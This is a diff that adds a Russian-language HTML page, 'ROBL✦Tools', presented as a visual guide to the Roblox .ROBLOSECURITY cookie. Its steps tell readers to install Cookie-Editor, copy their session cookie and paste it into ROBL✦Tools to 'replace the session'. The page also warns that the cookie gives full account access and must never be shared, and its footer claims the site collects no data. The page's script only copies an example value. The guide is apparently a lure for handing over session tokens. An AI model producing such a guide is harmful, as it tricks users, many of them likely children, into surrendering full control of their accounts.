@@ -1,1 +1,505 @@
-# -ROBL-Toolsy
+
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>ROBL✦Tools • Как получить Cookie</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #0a0a0f 0%, #1a0b2e 30%, #2d1b4e 60%, #1a0b2e 100%);
+            background-size: 400% 400%;
+            animation: gradientShift 12s ease infinite;
+            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
+            padding: 40px 20px;
+            position: relative;
+        }
+
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        /* Звёзды с мерцанием */
+        body::before {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: radial-gradient(2px 2px at 15px 40px, #c084fc, transparent),
+                              radial-gradient(3px 3px at 100px 200px, #a855f7, transparent),
+                              radial-gradient(1px 1px at 250px 80px, #e9d5ff, transparent),
+                              radial-gradient(2px 2px at 400px 350px, #d8b4fe, transparent),
+                              radial-gradient(1px 1px at 550px 150px, #c084fc, transparent),
+                              radial-gradient(2px 2px at 700px 450px, #a855f7, transparent);
+            background-repeat: no-repeat;
+            opacity: 0.6;
+            pointer-events: none;
+            animation: twinkle 4s ease-in-out infinite alternate;
+        }
+
+        @keyframes twinkle {
+            0% { opacity: 0.4; }
+            100% { opacity: 0.8; }
+        }
+
+        /* Плавающие частицы */
+        body::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 30% 50%, rgba(168, 85, 247, 0.08) 0%, transparent 50%),
+                      radial-gradient(circle at 70% 80%, rgba(124, 58, 237, 0.08) 0%, transparent 50%);
+            pointer-events: none;
+            animation: floatGlow 10s ease-in-out infinite;
+        }
+
+        @keyframes floatGlow {
+            0%, 100% { opacity: 0.5; transform: scale(1); }
+            50% { opacity: 0.8; transform: scale(1.05); }
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* ШАПКА */
+        .header {
+            text-align: center;
+            margin-bottom: 50px;
+            animation: fadeInDown 0.8s ease;
+        }
+
+        .logo {
+            font-size: 68px;
+            font-weight: 800;
+            background: linear-gradient(135deg, #f0e6ff, #c084fc, #a855f7, #7c3aed);
+            background-size: 300% 300%;
+            animation: textFlow 4s ease infinite;
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            letter-spacing: -1px;
+            text-shadow: 0 0 30px rgba(168, 85, 247, 0.3);
+        }
+
+        @keyframes textFlow {
+            0%, 100% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+        }
+
+        .sub {
+            color: #d8b4fe;
+            font-size: 18px;
+            margin-top: 15px;
+            letter-spacing: 1px;
+        }
+
+        /* ГЛАВНАЯ КАРТОЧКА */
+        .main-card {
+            background: rgba(17, 15, 25, 0.75);
+            backdrop-filter: blur(20px);
+            border-radius: 40px;
+            padding: 40px;
+            margin-bottom: 30px;
+            animation: fadeInUp 0.8s ease;
+            border: 1px solid rgba(139, 92, 246, 0.5);
+            box-shadow: 0 0 30px rgba(139, 92, 246, 0.2);
+            transition: box-shadow 0.3s ease;
+        }
+
+        .main-card:hover {
+            box-shadow: 0 0 45px rgba(139, 92, 246, 0.4);
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card-title {
+            font-size: 28px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #e9d5ff, #c084fc);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        /* БЛОК РАСШИРЕНИЯ */
+        .extension-section {
+            background: rgba(0, 0, 0, 0.35);
+            border-radius: 28px;
+            padding: 25px;
+            margin: 25px 0;
+            border: 1px solid rgba(139, 92, 246, 0.4);
+        }
+
+        .extension-title {
+            font-size: 22px;
+            color: #d8b4fe;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .steps {
+            display: flex;
+            flex-direction: column;
+            gap: 20px;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 18px;
+            background: rgba(10, 8, 18, 0.5);
+            border-radius: 24px;
+            padding: 20px;
+            border-left: 3px solid #a855f7;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .step:hover {
+            transform: translateX(5px);
+            background: rgba(20, 15, 35, 0.7);
+            border-left-color: #c084fc;
+            box-shadow: 0 0 15px rgba(168, 85, 247, 0.2);
+        }
+
+        .step-number {
+            min-width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 18px;
+            color: white;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.5);
+        }
+
+        .step-content {
+            flex: 1;
+        }
+
+        .step-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: #e9d5ff;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .step-desc {
+            color: #a78bfa;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .step-desc code {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 3px 8px;
+            border-radius: 8px;
+            font-family: monospace;
+            color: #c084fc;
+        }
+
+        .check-icon {
+            color: #22c55e;
+            font-size: 16px;
+            animation: pulse 1.5s ease infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        /* Разделитель между шагами */
+        .step:not(:last-child)::after {
+            content: '✦';
+            position: absolute;
+            bottom: -14px;
+            left: 30px;
+            color: #a855f7;
+            font-size: 12px;
+            opacity: 0.5;
+        }
+
+        /* МАКЕТ ТВОЕГО САЙТА */
+        .your-site-mock {
+            background: #0a0a0f;
+            border-radius: 20px;
+            padding: 18px;
+            margin: 12px 0;
+            border: 1px solid rgba(139, 92, 246, 0.5);
+            text-align: center;
+        }
+
+        .mock-logo {
+            font-size: 20px;
+            font-weight: bold;
+            background: linear-gradient(135deg, #c084fc, #a855f7);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            margin-bottom: 12px;
+        }
+
+        .mock-field {
+            background: rgba(10, 8, 18, 0.9);
+            border: 1px solid rgba(139, 92, 246, 0.5);
+            border-radius: 14px;
+            padding: 12px;
+            font-family: monospace;
+            font-size: 11px;
+            color: #a78bfa;
+            margin: 12px 0;
+        }
+
+        .mock-btn {
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            border-radius: 40px;
+            padding: 10px;
+            text-align: center;
+            color: white;
+            font-weight: bold;
+            font-size: 13px;
+        }
+
+        .highlight {
+            border: 2px solid #c084fc;
+            border-radius: 14px;
+            padding: 8px;
+            background: rgba(168, 85, 247, 0.1);
+            box-shadow: 0 0 12px rgba(168, 85, 247, 0.3);
+        }
+
+        /* ПРИМЕР КУКИ */
+        .cookie-example {
+            background: #0a0a0f;
+            border-radius: 20px;
+            padding: 18px;
+            margin: 25px 0;
+            border-left: 4px solid #c084fc;
+            font-family: monospace;
+            font-size: 12px;
+            color: #c084fc;
+            word-break: break-all;
+            transition: 0.2s;
+        }
+
+        .cookie-example:hover {
+            background: #0f0f1a;
+            border-left-color: #e9d5ff;
+        }
+
+        .btn-copy {
+            background: linear-gradient(135deg, #7c3aed, #a855f7);
+            border: none;
+            border-radius: 40px;
+            padding: 12px 28px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: all 0.2s ease;
+            font-size: 15px;
+            display: block;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+            box-shadow: 0 0 10px rgba(168, 85, 247, 0.3);
+        }
+
+        .btn-copy:hover {
+            transform: scale(1.03);
+            box-shadow: 0 0 25px rgba(168, 85, 247, 0.6);
+        }
+
+        .note {
+            background: rgba(239, 68, 68, 0.12);
+            border-radius: 20px;
+            padding: 18px;
+            text-align: center;
+            color: #f87171;
+            font-size: 14px;
+            margin-top: 25px;
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            backdrop-filter: blur(4px);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 40px;
+            padding: 20px;
+            color: #a78bfa;
+            font-size: 12px;
+            border-top: 1px solid rgba(139, 92, 246, 0.2);
+        }
+
+        @media (max-width: 700px) {
+            .logo { font-size: 44px; }
+            .main-card { padding: 25px; }
+            .step { flex-direction: column; }
+            .step-number { align-self: flex-start; }
+            .step:not(:last-child)::after { left: 20px; }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <div class="logo">ROBL✦Tools</div>
+        <div class="sub">🍪 Визуальный гид по .ROBLOSECURITY Cookie</div>
+    </div>
+
+    <div class="main-card">
+        <div class="card-title">
+            <span>🍪</span> Что такое .ROBLOSECURITY?
+        </div>
+        <p style="color: #d8b4fe; line-height: 1.6; margin-bottom: 20px;">
+            Это специальный ключ (cookie), который хранит информацию о вашей сессии на Roblox. 
+            С его помощью можно восстановить доступ к аккаунту или перенести сессию на другой браузер.
+        </p>
+
+        <div class="extension-section">
+            <div class="extension-title">
+                <span>🧩</span> Как получить cookie и использовать на ROBL✦Tools
+            </div>
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <div class="step-content">
+                        <div class="step-title"><span>📦</span> Установи расширение</div>
+                        <div class="step-desc">
+                            Установи <strong>Cookie-Editor</strong> из Chrome Web Store (или Edge Add-ons).
+                        </div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <div class="step-content">
+                        <div class="step-title"><span>🔷</span> Зайди на Roblox</div>
+                        <div class="step-desc">
+                            Открой <strong>roblox.com</strong> и войди в свой аккаунт.
+                        </div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <div class="step-content">
+                        <div class="step-title"><span>🖱️</span> Открой расширение</div>
+                        <div class="step-desc">
+                            Нажми на иконку 🧩 <strong>Cookie-Editor</strong> в правом верхнем углу.
+                        </div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">4</div>
+                    <div class="step-content">
+                        <div class="step-title"><span>🔍</span> Найди .ROBLOSECURITY</div>
+                        <div class="step-desc">
+                            В списке найди <code>.ROBLOSECURITY</code>. Нажми — значение скопируется.
+                            <span class="check-icon">✅</span>
+                        </div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">5</div>
+                    <div class="step-content">
+                        <div class="step-title"><span>📋</span> Cookie скопирована</div>
+                        <div class="step-desc">
+                            Теперь у тебя в буфере обмена лежит .ROBLOSECURITY cookie.
+                        </div>
+                    </div>
+                </div>
+                <div class="step">
+                    <div class="step-number">6</div>
+                    <div class="step-content">
+                        <div class="step-title"><span>🟣</span> Вставь в ROBL✦Tools</div>
+                        <div class="step-desc">
+                            Открой <strong>ROBL✦Tools</strong>, вставь cookie в поле и нажми «Заменить сессию».
+                            <div class="your-site-mock highlight">
+                                <div class="mock-logo">ROBL✦Tools</div>
+                                <div class="mock-field">
+                                    🍪 .ROBLOSECURITY Cookie<br>
+                                    <span style="color: #c084fc;">_|WARNING:-DO-NOT-SHARE-THIS.--вставь сюда</span>
+                                </div>
+                                <div class="mock-btn">🔄 Заменить сессию</div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="cookie-example">
+            📋 <strong>Как выглядит .ROBLOSECURITY (пример):</strong><br><br>
+            <span>_|WARNING:-DO-NOT-SHARE-THIS.--Sx7kL9mN2PqR8tYv4UwXzA1bC3dE5fG6hJ7kL8zX9cV0bN1mQ2wE3rT4yU5iO6pA7sD8fG9hJ0kL</span>
+        </div>
+
+        <button class="btn-copy" id="copyExampleBtn">📋 Скопировать пример cookie</button>
+        <div id="copyMsg" style="color: #22c55e; margin-top: 12px; display: none; text-align: center;">✅ Пример скопирован!</div>
+
+        <div class="note">
+            🔒 <strong>Важно:</strong> Cookie начинается с <strong>_|WARNING</strong> — это нормально.<br>
+            <strong>Никому не передавай свою cookie</strong> — это полный доступ к аккаунту!
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>🍪 ROBL✦Tools — визуальный гид. Сайт не собирает данные.</p>
+    </div>
+</div>
+
+<script>
+    const copyBtn = document.getElementById('copyExampleBtn');
+    const copyMsg = document.getElementById('copyMsg');
+    const exampleCookie = '_|WARNING:-DO-NOT-SHARE-THIS.--Sx7kL9mN2PqR8tYv4UwXzA1bC3dE5fG6hJ7kL8zX9cV0bN1mQ2wE3rT4yU5iO6pA7sD8fG9hJ0kL';
+
+    copyBtn.addEventListener('click', async () => {
+        try {
+            await navigator.clipboard.writeText(exampleCookie);
+            copyMsg.style.display = 'block';
+            setTimeout(() => {
+                copyMsg.style.display = 'none';
+            }, 2000);
+        } catch (err) {
+            alert('Не удалось скопировать');
+        }
+    });
+</script>
+</body>
+</html>
